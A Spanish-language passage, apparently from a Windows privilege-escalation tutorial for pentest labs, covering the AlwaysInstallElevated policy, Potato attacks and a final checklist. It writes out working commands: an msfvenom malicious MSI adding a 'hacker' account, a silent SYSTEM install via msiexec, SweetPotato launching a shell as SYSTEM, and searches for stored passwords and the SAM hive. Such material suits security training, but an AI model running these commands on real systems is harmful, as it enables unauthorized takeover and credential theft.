## AlwaysInstallElevated: MSI como SYSTEM

Si el admin habilitó esta política, CUALQUIER .msi se instala con privilegios SYSTEM:

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Ambas deben ser 0x1 (1 en DWORD)
```

Si ambas son 1:

```bash
# Genera un .msi malicioso con msfvenom
msfvenom -p windows/adduser USER=hacker PASS=P@ss -f msi -o /tmp/adduser.msi
# Transfiérelo y:
msiexec /quiet /qn /i C:\temp\adduser.msi
```

## Ataques Potato (SeImpersonate)

La familia completa:

| Herramienta | Windows | Mecanismo |
|---|---|---|
| Juicy Potato | < Server 2019 | COM + NTLM relay al servicio Update |
| Rogue Potato | Server 2019+ | Igual pero con remote relay |
| SweetPotato | Universal | Varias técnicas combinadas |
| GodPotato | Server 2022+ | Named pipes + PrintSpooler |

```bash
# SweetPotato (el más versátil en labs):
sweetpotato.exe -p "C:\temp\shell.exe"    # ejecuta shell.exe como SYSTEM
```

## Tu checklist final de privesc Windows

```text
□ whoami /priv → ¿SeImpersonate? → Potato
□ sudo -l equivalente: accesschk -uwcqv user *
□ Servicios: rutas sin comillas (wmic service get pathname)
□ Servicios: binarios escribibles (accesschk -wcvu)
□ AlwaysInstallElevated: reg query (HKLM + HKCU)
□ Tareas programadas: schtasks + binarios escribibles
□ Parches: wmic qfe → ¿falta alguno crítico? → kernel exploit
□ Credenciales: cmdkey /list, findstr /si password, archivos .env
□ AutoRun: reg query HKLM\...\Run (¿binarios escribibles?)
□ SAM/SYSTEM: ¿puedes leer C:\Windows\System32\config\SAM?
```
